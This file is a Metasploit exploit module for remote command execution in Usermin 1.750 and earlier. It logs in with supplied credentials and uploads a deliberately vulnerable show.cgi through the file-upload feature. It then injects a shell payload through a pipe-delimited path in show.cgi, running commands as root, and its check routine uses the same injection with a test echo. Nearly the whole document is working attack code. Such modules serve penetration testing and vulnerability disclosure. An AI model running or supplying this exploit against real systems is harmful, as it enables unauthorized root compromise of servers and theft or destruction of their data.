##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'uri'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Usermin 1.750 - Remote Command Execution',
      'Description'    => %q{
          This module exploits an arbitrary command execution vulnerability in Usermin
        1.750 and lower versions. This vulnerability has the same characteristics as the Webmin 1.900 RCE(EDB-46201).
        Any user authorized to the "Java file manager" and "Upload and Download" fields, to execute arbitrary commands with root privileges.
        Usermin is the most shared interface with users, so the vulnerability is dangerous.
        In addition, "Running Processes" field must be authorized to discover the directory to be uploaded.
        A vulnerable ".cgi" file can be printed on the original files of the Usermin application.
        The vulberable file we are uploading should be integrated with the application. 
        Therefore, a ".cgi" file with the vulnerability belong to Usermin application should be used. 
        The module has been tested successfully with Usermin 1.750 over Debian 4.9.18.
      },
      'Author'         => [
        'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'https://pentest.com.tr/exploits/Usermin-1750-Remote-Command-Execution.html']
        ],
      'Privileged'     => true,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 512,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl ruby python telnet',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Usermin <= 1.750', { }]],
      'DisclosureDate' => 'Feb 27 2019',
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(20000),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('USERNAME',  [true, 'Usermin Username']),
          OptString.new('PASSWORD',  [true, 'Usermin Password'])
        ], self.class)
  end

##
# Target and input verification
##

  def check

    peer = "#{rhost}:#{rport}"
   
    vprint_status("Attempting to login...")

    data = "user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => "/session_login.cgi",
        'cookie'  => "redirect=1; testing=1",
        'data'    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /usid/
      vprint_good "Login successful"
      session = res.get_cookies.split("usid=")[1].split(";")[0]
      print_status("#{session}")
    else
      vprint_error "Service found, but login failed"
      return Exploit::CheckCode::Detected
    end

    vprint_status("Attempting to execute...")

    command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"

    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|",
        'cookie'  => "redirect=1; testing=1; usid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end

  end

##
# Exploiting phase
##

  def exploit

    peer = "#{rhost}:#{rport}"

    print_status("Attempting to login...")

    data = "page=%2F&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}"

    res = send_request_cgi(
      {
        'method'  => 'POST',
        'uri'     => "/session_login.cgi",
        'cookie'  => "redirect=1; testing=1",
        'data'    => data
      }, 25)

    if res and res.code == 302 and res.get_cookies =~ /usid/
      session = res.get_cookies.scan(/usid\=(\w+)\;*/).flatten[0] || ''
      if session and not session.empty?
        print_good "Login successfully"
      else
        print_error "Authentication failed"
        return
      end
    else
      print_error "Authentication failed"
      return
    end

##
# Directory and SSL verification for referer
##  
##
# Directory and SSL verification for referer
##  
ps = "#{datastore['SSL']}"
if ps == "true"
  ssl = "https://"
else
  ssl = "http://"
end

print_status("Target URL => #{ssl}#{peer}")

res1 = send_request_raw(
  {
    'method' => "POST",
    'uri'     => "/proc/index_tree.cgi?",
    'headers' =>
    {
      'Referer'   => "#{ssl}#{peer}/sysinfo.cgi?xnavigation=1",
    },
    'cookie'  => "redirect=1; testing=1; usid=#{session}"
  })

if res1 && res1.code == 200 && res1.body =~ /Running Processes/
  print_status "Using specified directory for upload..."
  dir = "/usr/share/usermin/file"   
  print_good("Directory to upload => #{dir}")
else
  print_error "No access to processes or upload directory not found."
  return
end

    
##
# Loading phase of the vulnerable file
##

    boundary = Rex::Text.rand_text_alphanumeric(29)

    data2 = "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"upload0\"; filename=\"show.cgi\"\r\n"
    data2 << "Content-Type: application/octet-stream\r\n\r\n"
    data2 << "#!/usr/local/bin/perl\n# show.cgi\n# Output some file for the browser\n\n"
    data2 << "$trust_unknown_referers = 1;\nrequire './file-lib.pl';\n&ReadParse();\nuse POSIX;\n"
    data2 << "$p = $ENV{'PATH_INFO'};\nif ($in{'type'}) {\n\t# Use the supplied content type\n\t"
    data2 << "$type = $in{'type'};\n\t$download = 1;\n\t}\nelsif ($in{'format'} == 1) {\n\t"
    data2 << "# Type comes from compression format\n\t$type = \"application/zip\";\n\t}\n"
    data2 << "elsif ($in{'format'} == 2) {\n\t$type = \"application/x-gzip\";\n\t}\n"
    data2 << "elsif ($in{'format'} == 3) {\n\t$type = \"application/x-tar\";\n\t}\nelse {\n\t"
    data2 << "# Try to guess type from filename\n\t$type = &guess_mime_type($p, undef);\n\t"
    data2 << "if (!$type) {\n\t\t# No idea .. use the 'file' command\n\t\t"
    data2 << "$out = &backquote_command(\"file \".\n\t\t\t\t\t  quotemeta(&resolve_links($p)), 1);\n\t\t"
    data2 << "if ($out =~ /text|script/) {\n\t\t\t$type = \"text/plain\";\n\t\t\t}\n\t\telse {\n\t\t\t"
    data2 << "$type = \"application/unknown\";\n\t\t\t}\n\t\t}\n\t}\n\n# Dump the file\n&switch_acl_uid();\n"
    data2 << "$temp = &transname();\nif (!&can_access($p)) {\n\t# ACL rules prevent access to file\n\t"
    data2 << "&error_exit(&text('view_eaccess', &html_escape($p)));\n\t}\n$p = &unmake_chroot($p);\n\n"
    data2 << "if ($in{'format'}) {\n\t# An archive of a directory was requested .. create it\n\t"
    data2 << "$archive || &error_exit($text{'view_earchive'});\n\tif ($in{'format'} == 1) {\n\t\t"
    data2 << "$p =~ s/\\.zip$//;\n\t\t}\n\telsif ($in{'format'} == 2) {\n\t\t$p =~ s/\\.tgz$//;\n\t\t}\n\t"
    data2 << "elsif ($in{'format'} == 3) {\n\t\t$p =~ s/\\.tar$//;\n\t\t}\n\t-d $p || &error_exit($text{'view_edir'}.\" \".&html_escape($p));\n\t"
    data2 << "if ($archive == 2 && $archmax > 0) {\n\t\t# Check if directory is too large to archive\n\t\tlocal $kb = &disk_usage_kb($p);\n\t\t"
    data2 << "if ($kb*1024 > $archmax) {\n\t\t\t&error_exit(&text('view_earchmax', $archmax));\n\t\t\t}\n\t\t}\n\n\t"
    data2 << "# Work out the base directory and filename\n\tif ($p =~ /^(.*\\/)([^\\/]+)$/) {\n\t\t$pdir = $1;\n\t\t"
    data2 << "$pfile = $2;\n\t\t}\n\telse {\n\t\t$pdir = \"/\";\n\t\t$pfile = $p;\n\t\t}\n\n\t"
    data2 << "# Work out the command to run\n\tif ($in{'format'} == 1) {\n\t\t"
    data2 << "&has_command(\"zip\") || &error_exit(&text('view_ecmd', \"zip\"));\n\t\t"
    data2 << "$cmd = \"zip -r $temp \".quotemeta($pfile);\n\t\t}\n\telsif ($in{'format'} == 2) {\n\t\t"
    data2 << "&has_command(\"tar\") || &error_exit(&text('view_ecmd', \"tar\"));\n\t\t"
    data2 << "&has_command(\"gzip\") || &error_exit(&text('view_ecmd', \"gzip\"));\n\t\t"
    data2 << "$cmd = \"tar cf - \".quotemeta($pfile).\" | gzip -c >$temp\";\n\t\t}\n\t"
    data2 << "elsif ($in{'format'} == 3) {\n\t\t&has_command(\"tar\") || &error_exit(&text('view_ecmd', \"tar\"));\n\t\t"
    data2 << "$cmd = \"tar cf $temp \".quotemeta($pfile);\n\t\t}\n\n\tif ($in{'test'}) {\n\t\t"
    data2 << "# Don't actually do anything if in test mode\n\t\t&ok_exit();\n\t\t}\n\n\t"
    data2 << "# Run the command, and send back the resulting file\n\tlocal $qpdir = quotemeta($pdir);\n\t"
    data2 << "local $out = `cd $qpdir ; ($cmd) 2>&1 </dev/null`;\n\tif ($?) {\n\t\tunlink($temp);\n\t\t"
    data2 << "&error_exit(&text('view_ecomp', &html_escape($out)));\n\t\t}\n\tlocal @st = stat($temp);\n\t"
    data2 << "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-type: $type\\n\\n\";\n\t"
    data2 << "open(FILE, $temp);\n\tunlink($temp);\n\twhile(read(FILE, $buf, 1024)) {\n\t\tprint $buf;\n\t\t}\n\t"
    data2 << "close(FILE);\n\t}\nelse {\n\tif (!open(FILE, $p)) {\n\t\t# Unix permissions prevent access\n\t\t"
    data2 << "&error_exit(&text('view_eopen', $p, $!));\n\t\t}\n\n\tif ($in{'test'}) {\n\t\t"
    data2 << "# Don't actually do anything if in test mode\n\t\tclose(FILE);\n\t\t"
    data2 << "&ok_exit();\n\t\t}\n\n\t@st = stat($p);\n\tprint \"X-no-links: 1\\n\";\n\t"
    data2 << "print \"Content-length: $st[7]\\n\";\n\tprint \"Content-Disposition: Attachment\\n\" if ($download);\n\t"
    data2 << "print \"Content-type: $type\\n\\n\";\n\tif ($type =~ /^text\\/html/i && !$in{'edit'}) {\n\t\t"
    data2 << "while(read(FILE, $buf, 1024)) {\n\t\t\t$data .= $buf;\n\t\t\t}\n\t\tprint &filter_javascript($data);\n\t\t"
    data2 << "}\n\telse {\n\t\twhile(read(FILE, $buf, 1024)) {\n\t\t\tprint $buf;\n\t\t\t}\n\t\t}\n\tclose(FILE);\n\t}\n\n"
    data2 << "sub error_exit\n{\nprint \"Content-type: text/plain\\n\";\n"
    data2 << "print \"Content-length: \",length($_[0]),\"\\n\\n\";\nprint $_[0];\nexit;\n}\n\n"
    data2 << "sub ok_exit\n{\nprint \"Content-type: text/plain\\n\\n\";\nprint \"\\n\";\nexit;\n}"
    data2 << "\r\n\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"dir\"\r\n\r\n#{dir}\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"zip\"\r\n\r\n0\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"email_def\"\r\n\r\n1\r\n"
    data2 << "-----------------------------{boundary}\r\n"
    data2 << "Content-Disposition: form-data; name=\"ok\"\r\n\r\nUpload\r\n"
    data2 << "-----------------------------{boundary}--\r\n"

    res2 = send_request_raw(
      {
        'method' => "POST",
        'uri'     => "/updown/upload.cgi?id=154739243511",
        'data' => data2,
        'headers' =>
        {
          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',
          'Referer' => "#{ssl}#{peer}/updown/?xnavigation=1",
        },
        'cookie'  => "redirect=1; testing=1; usid=#{session}"
      })

    if res2 and res2.code == 200 and res2.body =~ /Saving file/
      print_good "Vulnerable show.cgi file was successfully uploaded."
    else
      print_error "Upload failed."
      return
    end 
##
# Command execution and shell retrieval
##
    print_status("Attempting to execute the payload...")

    command = payload.encoded

    res = send_request_cgi(
      {
        'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
        'cookie'  => "redirect=1; testing=1; usid=#{session}"
      }, 25)


    if res and res.code == 200 and res.message =~ /Document follows/
      print_good "Payload executed successfully"
    else
      print_error "Error executing the payload"
      return
    end

  end

end
